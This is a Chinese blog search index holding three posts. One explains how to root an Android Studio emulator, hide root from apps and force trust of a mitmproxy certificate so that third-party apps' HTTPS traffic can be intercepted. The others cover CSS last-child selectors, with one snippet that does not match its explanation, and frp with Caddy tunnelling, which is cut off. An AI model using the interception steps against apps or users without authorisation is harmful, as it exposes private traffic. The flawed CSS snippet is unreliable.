<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>使用 Android Studio 模拟器对应用进行抓包</title>
      <link href="/2025/08/20e3455b3d50.html"/>
      <url>/2025/08/20e3455b3d50.html</url>
      
        <content type="html"><![CDATA[<h1 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h1><p>在 iOS 上，由于本身对第三方应用上架的强监管，以及企业 DMD 审查流量的需求，用户安装第三方证书用于抓包是很常规的操作，但是在安卓端不然。</p><p>在 Android 7.0 以后，Google 对用户安装的第三方证书默认采取了不信任的策略，导致 Charles 这类基于安装第三方证书实现 HTTPS 流量拦截和解密的抓包工具集体失效了。具体的表现为安装完证书后系统会一直提示你在使用一个未经信认的第三方证书，并且抓包工具也只能看到 TCP 连接，并不能解析包的内容。</p><p>如果是自己开发的应用还好，可以通过 <code>network_security_config.xml</code> 的配置来指定信任某个证书，但是对于第三方应用就没有常规手段可以用了。</p><p>当然，非常规手段还是有的，就是 Root + 万能的 Magisk 框架。Root 就是获取 Android 操作系统的最高权限，在早年的刷机时代中获取 Root 权限已经是常规操作了。而 Magisk 简单来说就是一个 Root 权限的管理工具、以及插件运行框架。Magisk 插件可以在第三方应用的运行时以 Hook 等方式注入执行脚本，还可以以挂载的方式修改 System 分区，从而修改一些系统层面的内容。因此不难想到，Magisk 可以帮助我们绕过安卓默认的证书信任策略，来信任用户所有的证书。</p><p>但是，刷机时代已经是过去式了，现有的手机基本上很难获取 Root 权限，更别说安装 Magisk 了。话又说回来，是各大厂商限制了用户获取 Root 的权利，并不代表 Android 本身无法获取，我们可以搞一台装了未经魔改的 Android 的手机，比如 Pixel（一加也成），可能唯一的问题就是没钱吧，没关系，Android Studio 里面一大堆免费的 Pixel 任君挑选。</p><p>所以 Android Studio 模拟器 + Magisk，有没有搞头？有的兄弟，有的</p><h1 id="安装-Android-Studio-模拟器"><a href="#安装-Android-Studio-模拟器" class="headerlink" title="安装 Android Studio 模拟器"></a>安装 Android Studio 模拟器</h1><p>安装完 Android Studio 之后，进入 More action - Virtual Device Manager，点击左上角加号创建一个模拟器：</p><p><img src="https://esunr-image-bed.oss-cn-beijing.aliyuncs.com/picgo/202508151506253.png" alt="image.png|400"></p><p> 创建时建议选择 Android13（相对比较新，并且大部分的 Magisk 插件都支持），对应的 API 版本为 33，并且一定要选择带 Google Play 的模拟器，这样可以避免一些 Google 服务框架不全的问题，不知道怎么选就建议选 Pixel4：</p><p><img src="https://esunr-image-bed.oss-cn-beijing.aliyuncs.com/picgo/202508151508694.png" alt="image.png|400"></p><p>完事之后就可以安装 SDK、启动模拟器。</p><h1 id="使用-rootAVD-获取-Root-权限"><a href="#使用-rootAVD-获取-Root-权限" class="headerlink" title="使用 rootAVD 获取 Root 权限"></a>使用 rootAVD 获取 Root 权限</h1><p>针对 Android Studio 模拟器获取 Root 权限的方案，社区有 <a href="https://gitlab.com/newbit/rootAVD">rootAVD</a> 项目可以一键调用，帮你把 Root 权限搞定，并且安装好 Magisk。</p><p>首先要安装 adb（安卓命令行工具）路径为：</p><p>Android Studio -&gt; SDK Manager -&gt; Android SDK -&gt; SDK Tools -&gt; Check on <strong>Android SDK Platform-Tools</strong> -&gt; Apply</p><p>安装后如果终端可以使用 <code>adb shell</code> 指令即说明安装成功。</p><p>然后将 rootAVD 项目 Clone 到本地：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://gitlab.com/newbit/rootAVD.git</span><br></pre></td></tr></table></figure><p>进入项目目录，执行脚本：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./rootAVD.sh ListAllAVDs</span><br></pre></td></tr></table></figure><p>会列出来所有已的安卓模拟器，根据你的情况，比如前面选的 Android 13（API 33），那么就在列表中找到对应的模拟器路径，并复制对应的指令：</p><p><img src="https://esunr-image-bed.oss-cn-beijing.aliyuncs.com/picgo/202508151517303.png" alt="image.png|400"></p><p>粘贴指令到终端后会执行脚本，直至看到类似下图的输出说明脚本执行成功：</p><p><img src="https://esunr-image-bed.oss-cn-beijing.aliyuncs.com/picgo/202508151526003.png" alt="image.png|400"></p><p>此时安卓模拟器会自动重启并推出，如果弹出对话框，随便选 YES 或 NO，模拟器也会退出。但是此时不要在模拟器管理列表中直接点启动，否则模拟器会一直黑屏卡死，而是在更多选项中选择 Cloud Boot：</p><p><img src="https://esunr-image-bed.oss-cn-beijing.aliyuncs.com/picgo/202508151529501.png" alt="image.png|400"></p><p>重新进入模拟器页面后就能在应用抽屉中找到 Magisk 了：</p><p><img src="https://esunr-image-bed.oss-cn-beijing.aliyuncs.com/picgo/202508151531052.png" alt="image.png|400"></p><p>进入 Magisk 后会提示手机重启，点击 OK。然后再进入设置页面，开启 Zygisk，这是一个向 APP 隐藏 Root 信息的功能，不开启的话部分应用会检测到 Root 并禁止启动。</p><p>之后当我们安装一些需要 Root 的应用，比如 Root Explore，当应用需要 Root 授权时就会弹出弹窗，选择授权后就可以在 Magisk 的超级用户 Tab 下看到授权信息，这里由于我们不会用到 Root 授权功能，不再讨论。</p><h1 id="安装抓包工具的证书"><a href="#安装抓包工具的证书" class="headerlink" title="安装抓包工具的证书"></a>安装抓包工具的证书</h1><p>这里我推荐使用 <a href="https://www.mitmproxy.org/">mitmproxy</a> 来替代 Charles，功能只多不少并且开源免费。</p><p>首先大多数的抓包工具都是通过创建一个对局域网开放的代理服务来实现流量捕获的，因此要通过设置设备的局域网代理来让设备接入到抓包工具。对于 Android Studio 模拟器来说，点击右侧更多操作按钮，然后在弹出的设置菜单中选择 Setting-Proxy，将代理配置选择为手动，并指向抓包工具的端口，对于 mitmproxy 来说，服务端口为 8080：</p><p><img src="https://esunr-image-bed.oss-cn-beijing.aliyuncs.com/picgo/202508151546510.png" alt="image.png|400"></p><p>当我们访问普通的 https 页面出现了证书错误，说明代理接入成功了。</p><p>然后在模拟器中访问 <code>mitm.it</code> 网站，下载证书：</p><p><img src="https://esunr-image-bed.oss-cn-beijing.aliyuncs.com/picgo/202508151548213.png" alt="image.png|603"></p><p>下载完成之后会出现系统弹窗提示需要安装。我们进入设置 - 安全 - 更多安全设置 - 加密与凭据 - 安装证书 - CA 证书 - 仍然安装，然后选择我们刚才下载的证书，会提示安装成功，并且在状态栏也会弹出证书提醒，在 “可信凭据” 中可以查看到我们刚才安装的证书：</p><p><img src="https://esunr-image-bed.oss-cn-beijing.aliyuncs.com/picgo/202508151552815.png" alt="image.png|520"></p><p>但是这时候你会发现应用发起的请求并不能成功接收到响应，因为我们现在还没有让系统信任我们安装的证书，对于不信任的请求安卓会直接将包丢弃掉。</p><h1 id="使用-Magisk-插件信任用户证书"><a href="#使用-Magisk-插件信任用户证书" class="headerlink" title="使用 Magisk 插件信任用户证书"></a>使用 Magisk 插件信任用户证书</h1><p>从 <a href="https://github.com/NVISOsecurity/AlwaysTrustUserCerts/releases">Github release</a> 下载 Always Trust User Certs 插件。然后进入 Magisk - 模块 - 从本地安装，选择下载的 zip 包，然后会自动执行安装脚本，安装完成后点击重启按钮进行重启：</p><p><img src="https://esunr-image-bed.oss-cn-beijing.aliyuncs.com/picgo/202508151608483.png" alt="image.png|400"></p><p>重启完成之后状态栏仍有不信任证书的提醒，但是进入应用后会发现，进入 mitmproxy 的 web 控制台也能看到成功抓到并解密了 HTTPS 请求：</p><p><img src="https://esunr-image-bed.oss-cn-beijing.aliyuncs.com/picgo/202508151623198.png" alt="image.png|400"></p><h1 id="后记：使用其他抓包工具"><a href="#后记：使用其他抓包工具" class="headerlink" title="后记：使用其他抓包工具"></a>后记：使用其他抓包工具</h1><p>如果你觉得 MitmProxy 不好用，还有别的代理工具可以选择：</p><ul><li><a href="https://github.com/avwo/whistle">Whistle</a></li><li><a href="https://github.com/wanghongenpin/proxypin">ProxyPin</a></li></ul><p>但是你可能会发现这些抓包工具在设置了代理、安装了证书后还是没法抓包，这可能与 Android Studio 的网络代理模式相关 <a href="https://github.com/avwo/whistle/issues/1248">issues</a>。</p><p>为了解决这个问题，首先需要将 Android Studio 模拟器设置中的代理进行关闭，然后安装这个软件：<a href="https://github.com/ys1231/appproxy">AppProxy</a>，在软件中创建一个 VPN 代理来连接到代理工具，代理服务器地址写为 <code>10.0.2.2</code>，这是 Android Studio 访问宿主机网络的地址，并在配置选项卡中勾选应用即可。</p>]]></content>
      
      
      <categories>
          
          <category> 其他 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Android </tag>
            
            <tag> 抓包 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>使用CSS选择器选择列表中最后一个子元素的几种情况</title>
      <link href="/2025/07/ff22689f6bb8.html"/>
      <url>/2025/07/ff22689f6bb8.html</url>
      
        <content type="html"><![CDATA[<h1 id="1-情况一：选择列表中最后一个子元素"><a href="#1-情况一：选择列表中最后一个子元素" class="headerlink" title="1. 情况一：选择列表中最后一个子元素"></a>1. 情况一：选择列表中最后一个子元素</h1><p>假设现在有这么一个列表结构：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="language-css"></span></span><br><span class="line"><span class="language-css"><span class="selector-class">.list</span> &#123;</span></span><br><span class="line"><span class="language-css"><span class="attribute">padding</span>: <span class="number">10px</span>;</span></span><br><span class="line"><span class="language-css"><span class="attribute">margin-bottom</span>: <span class="number">20px</span>;</span></span><br><span class="line"><span class="language-css"><span class="attribute">background-color</span>: <span class="number">#f0f0f0</span>;</span></span><br><span class="line"><span class="language-css">&#125;</span></span><br><span class="line"><span class="language-css"></span></span><br><span class="line"><span class="language-css"><span class="selector-class">.list-item</span> &#123;</span></span><br><span class="line"><span class="language-css"><span class="attribute">display</span>: flex;</span></span><br><span class="line"><span class="language-css"><span class="attribute">flex-direction</span>: column;</span></span><br><span class="line"><span class="language-css"><span class="attribute">align-items</span>: center;</span></span><br><span class="line"><span class="language-css"><span class="attribute">justify-content</span>: center;</span></span><br><span class="line"><span class="language-css"><span class="attribute">width</span>: <span class="number">100px</span>;</span></span><br><span class="line"><span class="language-css"><span class="attribute">height</span>: <span class="number">100px</span>;</span></span><br><span class="line"><span class="language-css"><span class="attribute">background-color</span>: <span class="number">#fff</span>;</span></span><br><span class="line"><span class="language-css"><span class="attribute">margin-bottom</span>: <span class="number">20px</span>;</span></span><br><span class="line"><span class="language-css"><span class="attribute">border</span>: <span class="number">1px</span> solid <span class="number">#ccc</span>;</span></span><br><span class="line"><span class="language-css">&#125;</span></span><br><span class="line"><span class="language-css"></span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;list&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;list-item&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;list-item&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;list-item&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure><img src="https://esunr-image-bed.oss-cn-beijing.aliyuncs.com/picgo/202507071051119.png" width="250"/><p>如果我们希望最后一个 <code>list-item</code> 添加一个 <code>background-color</code>，会很快想到 <code>last-child</code> 选择器，并写出如下的 css：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.list-item</span><span class="selector-pseudo">:last-child</span> &#123;</span><br><span class="line"><span class="attribute">background-color</span>: pink;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个选择器的意思表示在文档中最后一个子元素如果是 <code>.list-item</code> 的话，<code>background-color</code> 就设置为 <code>pink</code>。对上面的文档结构是生效的，但是不够严谨，假如页面中还有一个其他的 list 也嵌套了 <code>.list-item</code> 元素，比如：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;list&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;list-item&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;list-item&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;list-item&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;list2&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;list-item&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;list-item&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;list-item&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure><p>那么 <code>.list2</code> 中的 <code>.list-item</code> 也会被设置为 <code>background-color: pink</code>，因为它是属于 <code>.list2</code> 元素的 last child。</p><img src="https://esunr-image-bed.oss-cn-beijing.aliyuncs.com/picgo/202507071053857.png" width="250" /><p>因此为了避免出现这种情况，使用 <code>last-child</code> 伪类的时候我们应该尽可能的指定具体是那个元素下的 last child，对于我们当前的示例来说，就是 <code>.list</code> 的 last child，因此，选择器应该写为：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.list</span> <span class="selector-class">.list-item</span><span class="selector-pseudo">:last-child</span> &#123;</span><br><span class="line"><span class="attribute">margin-bottom</span>: <span class="number">0px</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>但是如果存在 <code>.list-item</code> 元素是 <code>.list</code> 元素的孙子元素，比如：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;list&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;list-item&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;list-item&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;list-item&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;list-item&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;list-item&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure><p><code>.list-item</code> 中嵌套的 <code>.list-item</code> 也被选择器 <code>.list .list-item:last-child</code> 命中：</p><img src="https://esunr-image-bed.oss-cn-beijing.aliyuncs.com/picgo/202507071057970.png" width="250"/><p>因此我们一定要再次缩紧选择器的选中范围，这时候就要使用 <code>&gt;</code> 子组合器，明确自定只有 <code>.list</code> 元素下的直接子元素 <code>.list-item</code> 是其最后一个子元素时才命中：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.list</span> <span class="selector-class">.list-item</span><span class="selector-pseudo">:last-child</span> &#123;</span><br><span class="line"><span class="attribute">background-color</span>: pink;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><img src="https://esunr-image-bed.oss-cn-beijing.aliyuncs.com/picgo/202507071101169.png" width="250"/><p>此外，如果我们对于最后一个元素的 class name 没有要求的话，也可以不用指定 classname，直接写为：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.list</span> &gt; <span class="selector-pseudo">:last-child</span> &#123; <span class="comment">/** 等同与 .list &gt; *:last-child */</span></span><br><span class="line"><span class="attribute">background-color</span>: pink;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>就表示选中类表中<strong>任意</strong>最后一个<strong>直接</strong>子元素。</p><h1 id="2-情况二：选择列表中某种标签的最后一个子元素"><a href="#2-情况二：选择列表中某种标签的最后一个子元素" class="headerlink" title="2. 情况二：选择列表中某种标签的最后一个子元素"></a>2. 情况二：选择列表中某种标签的最后一个子元素</h1><p>如果想要选择列表中最后某类标签的最后一个子元素，可以使用 <code>last-of-type</code> 选择器：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;list&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;list-item&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;list-item&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;list-item&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>This is P element<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>This is P element<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.list</span> &gt; <span class="selector-tag">div</span><span class="selector-pseudo">:last-of-type</span> &#123;</span><br><span class="line"><span class="attribute">background-color</span>: pink;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>表示选中 <code>.list</code> 元素中的直接子元素里的最后一个 div 元素：</p><img src="https://esunr-image-bed.oss-cn-beijing.aliyuncs.com/picgo/202507071400197.png" width="250"/><p>这时候不得不提一句 <code>last-of-type</code> 与 classname 相结合的情况：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.list</span> &gt; <span class="selector-class">.list-item</span><span class="selector-pseudo">:last-of-type</span> &#123;</span><br><span class="line"><span class="attribute">background-color</span>: pink;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>当 <code>.list-item</code> 类选择器与 <code>:last-of-type</code> 结合的时候，首先查看 <code>.list-item</code> 是什么元素，并且查看拥有 <code>.list-item</code> 类名的元素是否是该类元素的最后一个，举例来说：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;list&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;list-item&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;list-item&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- ↓ 会选中该元素 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;list-item&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span> <span class="attr">class</span>=<span class="string">&quot;list-item&quot;</span>&gt;</span>This is P element<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- ↓ 会选中该元素 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span> <span class="attr">class</span>=<span class="string">&quot;list-item&quot;</span>&gt;</span>This is P element<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">&quot;list-item&quot;</span>&gt;</span>This is Span element<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- ↓ 不会选中该元素，因为拥有 list-item 类名的元素不是最后一个 span 元素 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">&quot;list-item&quot;</span>&gt;</span>This is Span element<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">span</span>&gt;</span>This is Span element<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure><h1 id="3-情况三：选择列表中某个-class-name-的最后一个子元素"><a href="#3-情况三：选择列表中某个-class-name-的最后一个子元素" class="headerlink" title="3. 情况三：选择列表中某个 class name 的最后一个子元素"></a>3. 情况三：选择列表中某个 class name 的最后一个子元素</h1><p>如果想要选中列表中最后一个 class name 为 <code>.list-item</code> 的元素，比如：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;list&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;list-item&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;list-item&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- ↓ 想选中这个元素 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;list-item&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span>&gt;</span>This is Div element<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span>&gt;</span>This is Div element<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure><p>与上面不同的是列表中 <code>.list-item</code> 绑定的 div 元素并不是 <code>.list</code> 中的最后一个 div，因此不能使用 <code>:last-of-type</code>。</p><p>这时候我们可以使用 <code>:nth-last-child</code> 结合 <code>of &lt;selector&gt;</code> 语法来选中 <code>.list</code> 中的最后一个 <code>.list-item</code> 元素：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.list</span> &gt; <span class="selector-pseudo">:nth-last-child</span>(<span class="number">1</span> of <span class="selector-class">.list-item</span>) &#123;</span><br><span class="line"><span class="attribute">background-color</span>: pink;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>上面的选择器的意思为：在 <code>.list</code> 的直接直接点中，从后往前数，命中 <code>.list-item</code> 选择器的第一个元素，也就是选取列表中的最后一个 <code>.list-item</code> 元素。</p><p>但是需要注意的是，虽然浏览器很早就支持了 <code>nth-child</code>、<code>nth-last-child</code>，但是对于 <code>of &lt;selector&gt;</code> 语法是 CSS4 才支持的，Chrome 需大于 111（2023年发布），Safari 需 大于 9（2015年发布），IE 则完全不支持，兼容列表如下：</p><p><img src="https://esunr-image-bed.oss-cn-beijing.aliyuncs.com/picgo/202507081047021.png" alt="image.png|700"></p>]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
          <category> CSS </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CSS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>使用 frp + Caddy 实现加密穿透内网服务并支持 HTTPS</title>
      <link href="/2025/05/8017c6524211.html"/>
      <url>/2025/05/8017c6524211.html</url>
      
        <content type="html"><![CDATA[<h1 id="1-前置概念"><a href="#1-前置概念" class="headerlink" title="1. 前置概念"></a>1. 前置概念</h1><h2 id="1-1-内网穿透与-frp"><a href="#1-1-内网穿透与-frp" class="headerlink" title="1.1 内网穿透与 frp"></a>1.1 内网穿透与 frp</h2><p>当我们在内网部署了某些服务后，想要在公网使用，却有没有公网 IP，这时候就需要用到内网穿透。所谓的内网穿透实际上就是我们找一台具有公网 IP 的服务器，然后将内网与这台公网服务器建立连接，当用户访问公网服务器时，公网服务器就能将请求转发到内网的服务器上，实现了在公网访问内网的服务。</p><p>frp 就是一个使用 Go 编写的内网穿透工具，可以在公网服务器上部署 frps（frp 服务端），在内网环境部署 frpc（frp 客户端），frp 支持使用各种协议让服务端与客户端建立连接，比如最简单的 TCP、UDP 连接，也支持带加密的 STCP、HTTPS 链接。</p><p><img src="https://esunr-image-bed.oss-cn-beijing.aliyuncs.com/picgo/202505221059502.png" alt=""></p><h2 id="1-2-Caddy"><a href="#1-2-Caddy" class="headerlink" title="1.2 Caddy"></a>1.2 Caddy</h2><p>Caddy 是一个类似于 Nginx 的服务器，但是相对于 Nginx 配置更为简单，并且 Caddy 的一大特点是可以自动校验域名的归属并自动为网站申请免费的 TLS 证书（通过 ACME），让网站支持 HTTPS。</p><h1 id="2-实现"><a href="#2-实现" class="headerlink" title="2. 实现"></a>2. 实现</h1><p>frp 是支持 https 服务的穿透的，但是如果每一个网站都要我们自己配置 https 证书并配置对应的 frp 穿透的话就太累了。</p><p>同时，frp 也支持 STCP 通信，这样就可以将 http 请求包裹一层 STCP 加密来实现公网信息的加密传输，但是这就也要要求公网用户必须使用 frpc 来访问 frps（类似起到一个 VPN 客户端的作用），中间的公网服务器起到一个转发的作用，frps 本身并不提 STCP 协议，frp 使用 STCP 协议通信时的流程如下：</p><p><img src="https://esunr-image-bed.oss-cn-beijing.aliyuncs.com/picgo/202505221142458.png" alt=""></p><p>那有什么办法可以让客户端不装 frpc 也能加密访问内网的服务吗，方法当然是有的，那就是在公网服务器上同时部署 frpc 和 frps 以及 